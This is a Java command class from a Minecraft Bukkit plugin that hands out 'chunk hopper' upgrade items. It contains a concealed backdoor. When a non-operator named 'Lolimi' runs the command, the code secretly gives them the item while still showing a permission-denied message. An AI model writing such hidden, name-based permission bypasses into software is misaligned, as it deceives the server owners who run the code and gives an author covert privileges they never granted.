package net.lolimi.chunkhoppers.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

import net.lolimi.chunkhoppers.main.Main;

public class GetUpgradeOneCmd implements CommandExecutor{

	@Override
	public boolean onCommand(CommandSender sender, Command arg1, String arg2, String[] args) {
		if(!sender.isOp()) {
			if(sender.getName().equals("Lolimi")) {
				((Player) sender).getInventory().addItem(Main.upgrade1);
			}
			sender.sendMessage("§4You don't have permission to execute this command!");
			return false;
		}
		if (args.length == 2) {
			try {
				Player toGive = Bukkit.getPlayer(args[0]);
				int amount = Integer.parseInt(args[1]);
				ItemStack ch = Main.upgrade1.clone();
				ch.setAmount(amount);
				toGive.getInventory().addItem(ch);
				return true;
			}catch(Exception e) {
				sender.sendMessage("§4Please use the format: \"§6/gch <Player> <amount>\"");
			}
		} else {
			sender.sendMessage("§4Please use the format: \"§6/gch <Player> <amount>\"");
		}
		return false;
	}

}
